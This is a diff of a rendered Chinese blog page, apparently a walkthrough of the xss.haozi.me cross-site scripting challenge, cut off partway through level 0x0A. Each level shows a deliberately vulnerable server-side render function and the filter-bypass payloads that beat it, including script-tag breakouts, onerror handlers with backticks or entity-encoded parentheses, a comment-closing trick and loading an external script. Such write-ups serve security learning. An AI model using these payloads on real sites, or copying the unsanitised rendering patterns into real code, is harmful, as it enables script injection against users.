@@ -216,7 +216,6 @@
   <main>
     
       
-
 <div class="container-fluid nopadding-x">
   <div class="row nomargin-x">
     <div class="d-none d-lg-block col-lg-2"></div>
@@ -239,37 +238,63 @@
 
 
 
-<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;div&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span><br>&#125;<br><br>前端代码:<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;
+  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;div&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/div&gt;&#x27;</span>
+&#125;
+
+前端代码:
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span></code></pre></div>
 
 <p>服务器端没有任何过滤直接执行JavaScript代码即可</p>
-<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">payload:<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs js">payload:
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-01.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
 
 
 
-<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;textarea&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/textarea&gt;&#x27;</span><br>&#125;<br><br>前端代码:<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;
+  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;textarea&gt;&#x27;</span> + input + <span class="hljs-string">&#x27;&lt;/textarea&gt;&#x27;</span>
+&#125;
+
+前端代码:
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">textarea</span>&gt;</span></span></code></pre></div>
 
 <p>服务器虽然没有进行过滤,但是前端的<code>textarea</code>标签会将JavaScript代码文本化直接输出，所以添加一个结束标签凑成一对就能绕过</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">payload:<br>&lt;<span class="hljs-regexp">/textarea&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs javascript">payload:
+&lt;<span class="hljs-regexp">/textarea&gt;&lt;script&gt;alert(1)&lt;/</span>script&gt;</code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-02.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
 
 
 
-<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27;</span> + input + <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span><br>&#125;<br><br>前端代码:<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;
+  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;input type=&quot;name&quot; value=&quot;&#x27;</span> + input + <span class="hljs-string">&#x27;&quot;&gt;&#x27;</span>
+&#125;
+
+前端代码:
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;name&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&quot;</span>&gt;</span></span></code></pre></div>
 
 <p>服务器依旧没有进行过滤,不过这次代码插入在<code>input</code>标签下的<code>value</code>属性下,依旧会吧JavaScript代码文本化直接输出,因此将<code>value的双引号</code>和<code>input的右尖括号</code>补全 即可绕过</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">payload:<br><span class="hljs-string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs javascript">payload:
+<span class="hljs-string">&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span></code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-03.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
 
 
 
-<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> stripBracketsRe = <span class="hljs-regexp">/[()]/g</span><br>  input = input.replace(stripBracketsRe, <span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> input<br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;
+  <span class="hljs-keyword">const</span> stripBracketsRe = <span class="hljs-regexp">/[()]/g</span>
+  input = input.replace(stripBracketsRe, <span class="hljs-string">&#x27;&#x27;</span>)
+  <span class="hljs-keyword">return</span> input
+&#125;</code></pre></div>
 
 <p>这题服务器终于对JavaScript代码进行过滤了,使用是正则表达式匹配,如果匹配成功就替换成空</p>
 <ul>
@@ -280,14 +305,30 @@
 <li>这个正则表达式的意思就是,全局匹配<code>左括号和有括号</code></li>
 </ul>
 <p>染过方法有很多</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs html">payload:<br>可用反引号代替括号<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert</span>`<span class="hljs-attr">1</span>`&gt;</span><br><br>可用Html实体编码表示左右括号<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;lpar;1&amp;rpar;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#40;1&amp;#41;</span>&gt;</span><br><span class="hljs-symbol">&amp;lpar;</span>和<span class="hljs-symbol">&amp;#40;</span>表示左括号(<br><span class="hljs-symbol">&amp;rpar;</span>和<span class="hljs-symbol">&amp;#41;</span>表示右括号)<br><br>可以引用外部js文件<br><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://xss.haozi.me/j.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs html">payload:
+可用反引号代替括号
+<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert</span>`<span class="hljs-attr">1</span>`&gt;</span>
+
+可用Html实体编码表示左右括号
+<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;lpar;1&amp;rpar;</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert&amp;#40;1&amp;#41;</span>&gt;</span>
+<span class="hljs-symbol">&amp;lpar;</span>和<span class="hljs-symbol">&amp;#40;</span>表示左括号(
+<span class="hljs-symbol">&amp;rpar;</span>和<span class="hljs-symbol">&amp;#41;</span>表示右括号)
+
+可以引用外部js文件
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://xss.haozi.me/j.js&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-04.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
 
 
 
-<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> stripBracketsRe = <span class="hljs-regexp">/[()`]/g</span><br>  input = input.replace(stripBracketsRe, <span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> input<br>&#125;<br></code></pre></td></tr></table></figure>
+<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;
+  <span class="hljs-keyword">const</span> stripBracketsRe = <span class="hljs-regexp">/[()`]/g</span>
+  input = input.replace(stripBracketsRe, <span class="hljs-string">&#x27;&#x27;</span>)
+  <span class="hljs-keyword">return</span> input
+&#125;</code></pre></div>
 
 <p>这题和0x03很像,就是正则表达式多了个反引号检测,所以0x03的payload除了第一条,其他都能用</p>
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-05.png" srcset="/Study/img/loading.gif" lazyload></p>
@@ -295,60 +336,136 @@
 
 
 
-<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.replace(<span class="hljs-regexp">/--&gt;/g</span>, <span class="hljs-string">&#x27;😂&#x27;</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;!-- &#x27;</span> + input + <span class="hljs-string">&#x27; --&gt;&#x27;</span><br>&#125;<br><br>前端代码:<br>&lt;!--  --&gt;<br></code></pre></td></tr></table></figure>
+<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;
+  input = input.replace(<span class="hljs-regexp">/--&gt;/g</span>, <span class="hljs-string">&#x27;😂&#x27;</span>)
+  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&lt;!-- &#x27;</span> + input + <span class="hljs-string">&#x27; --&gt;&#x27;</span>
+&#125;
+
+前端代码:
+&lt;!--  --&gt;</code></pre></div>
 
 <p>服务器使用正则表达式进行了过滤,<code>--&gt;</code>被替换成😂,然而<code>&lt;!--</code>与<code>--&gt;</code>组成一个HTML注释,但是HTML还有一种与能与<code>&lt;!--</code>组成,就是<code>--!&gt;</code>,HTML会自动转为<code>--&gt;</code></p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">payload:<br>--!&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs javascript">payload:
+--!&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span>alert(1)<span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-06.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
 
 
 
-<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  input = input.replace(<span class="hljs-regexp">/auto|on.*=|&gt;/ig</span>, <span class="hljs-string">&#x27;_&#x27;</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;input value=1 <span class="hljs-subst">$&#123;input&#125;</span> type=&quot;text&quot;&gt;`</span><br>&#125;<br><br>前端代码:<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">1</span>  <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h2 id="0x06"><a href="#0x06" class="headerlink" title="0x06"></a>0x06</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;
+  input = input.replace(<span class="hljs-regexp">/auto|on.*=|&gt;/ig</span>, <span class="hljs-string">&#x27;_&#x27;</span>)
+  <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;input value=1 <span class="hljs-subst">$&#123;input&#125;</span> type=&quot;text&quot;&gt;`</span>
+&#125;
+
+前端代码:
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">value</span>=<span class="hljs-string">1</span>  <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span></span></code></pre></div>
 
 <p>服务器依旧使用正则表达式过滤,把<code>auto</code>、<code>&gt;</code>、<code>on来头=结尾</code>,正则表达式的<code>i</code>是<code>不区分大小写</code>,但是正则表达式没有过滤换行</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs javascript">payload:<br>onclick<br>=alert(<span class="hljs-number">1</span>)<br>单机文本框即可触发JavaScript代码<br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs javascript">payload:
+onclick
+=alert(<span class="hljs-number">1</span>)
+单机文本框即可触发JavaScript代码</code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-07.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
 
 
 
-<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">const</span> stripTagsRe = <span class="hljs-regexp">/&lt;\/?[^&gt;]+&gt;/gi</span><br><br>  input = input.replace(stripTagsRe, <span class="hljs-string">&#x27;&#x27;</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;article&gt;<span class="hljs-subst">$&#123;input&#125;</span>&lt;/article&gt;`</span><br>&#125;<br><br>前端代码:<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">article</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h2 id="0x07"><a href="#0x07" class="headerlink" title="0x07"></a>0x07</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;
+  <span class="hljs-keyword">const</span> stripTagsRe = <span class="hljs-regexp">/&lt;\/?[^&gt;]+&gt;/gi</span>
+
+  input = input.replace(stripTagsRe, <span class="hljs-string">&#x27;&#x27;</span>)
+  <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;article&gt;<span class="hljs-subst">$&#123;input&#125;</span>&lt;/article&gt;`</span>
+&#125;
+
+前端代码:
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">article</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">article</span>&gt;</span></span></code></pre></div>
 
 <p>服务器使用正则表达式,对<code>&lt;&gt;</code>括起来的内容进行过滤替换成空,但是由于<code>HTML</code>的容错性极高,所以,对于不闭合也能接受</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">payload:<br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span></span><br><span class="hljs-tag">     后面加\\ 空格 回车 才能触发</span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs html">payload:
+<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span></span>
+<span class="hljs-tag">     后面加\\ 空格 回车 才能触发</span></code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-08.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
 
 
 
-<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">src</span>) </span>&#123;<br>  src = src.replace(<span class="hljs-regexp">/&lt;\/style&gt;/ig</span>, <span class="hljs-string">&#x27;/* \u574F\u4EBA */&#x27;</span>)<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">`</span><br><span class="hljs-string">    &lt;style&gt;</span><br><span class="hljs-string">      <span class="hljs-subst">$&#123;src&#125;</span></span><br><span class="hljs-string">    &lt;/style&gt;</span><br><span class="hljs-string">  `</span><br>&#125;<br><br>前端代码:<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span><br><span class="xml"></span><br><span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<h2 id="0x08"><a href="#0x08" class="headerlink" title="0x08"></a>0x08</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">src</span>) </span>&#123;
+  src = src.replace(<span class="hljs-regexp">/&lt;\/style&gt;/ig</span>, <span class="hljs-string">&#x27;/* \u574F\u4EBA */&#x27;</span>)
+  <span class="hljs-keyword">return</span> <span class="hljs-string">`</span>
+<span class="hljs-string">    &lt;style&gt;</span>
+<span class="hljs-string">      <span class="hljs-subst">$&#123;src&#125;</span></span>
+<span class="hljs-string">    &lt;/style&gt;</span>
+<span class="hljs-string">  `</span>
+&#125;
+
+前端代码:
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span></span>
+<span class="xml"></span>
+<span class="xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span></span></code></pre></div>
 
 <p>服务器正则表达式过滤了我们想要闭合的<code>style标签</code>,且忽略了大小写,但是正则表达式是以一个整体来判断,所以在style闭合标签里面加入空格,就能绕过</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">payload:<br>&lt;/style &gt;<br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span> alert(1) <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs javascript">payload:
+&lt;/style &gt;
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span> alert(1) <span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></span></code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-09.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
 
 
 
-<h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-keyword">let</span> domainRe = <span class="hljs-regexp">/^https?:\/\/www\.segmentfault\.com/</span><br>  <span class="hljs-keyword">if</span> (domainRe.test(input)) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;script src=&quot;<span class="hljs-subst">$&#123;input&#125;</span>&quot;&gt;&lt;/script&gt;`</span><br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid URL&#x27;</span><br>&#125;<br><br>前端代码:<br>Invalid URL<br></code></pre></td></tr></table></figure>
+<h2 id="0x09"><a href="#0x09" class="headerlink" title="0x09"></a>0x09</h2><div class="code-wrapper"><pre><code class="hljs javascript">服务器端代码:
+<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;
+  <span class="hljs-keyword">let</span> domainRe = <span class="hljs-regexp">/^https?:\/\/www\.segmentfault\.com/</span>
+  <span class="hljs-keyword">if</span> (domainRe.test(input)) &#123;
+    <span class="hljs-keyword">return</span> <span class="hljs-string">`&lt;script src=&quot;<span class="hljs-subst">$&#123;input&#125;</span>&quot;&gt;&lt;/script&gt;`</span>
+  &#125;
+  <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;Invalid URL&#x27;</span>
+&#125;
+
+前端代码:
+Invalid URL</code></pre></div>
 
 <p>服务器使用正则表达式限制了,必须使用<code>https://www.sogmentfault.com</code>开头,且放在<code>script</code>标签的<code>src</code>属性里面.所以我们需要闭合绕过</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript">payload:<br>https:<span class="hljs-comment">//www.segmentfault.com&quot;&gt;&lt;/script&gt;</span><br><span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://xss.haozi.me/j.js&quot;</span></span></span><br></code></pre></td></tr></table></figure>
+<div class="code-wrapper"><pre><code class="hljs javascript">payload:
+https:<span class="hljs-comment">//www.segmentfault.com&quot;&gt;&lt;/script&gt;</span>
+<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;https://xss.haozi.me/j.js&quot;</span></span></span></code></pre></div>
 
 <p><img src="https://raw.githubusercontent.com/MokYan/Figurebed/master/img/xss-10.png" srcset="/Study/img/loading.gif" lazyload></p>
 <br>
 
 
 
-<h2 id="0x0A"><a href="#0x0A" class="headerlink" title="0x0A"></a>0x0A</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs javascript">服务器端代码:<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">render</span> (<span class="hljs-params">input</span>) </span>&#123;<br>  <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">escapeHtml</span>(<span 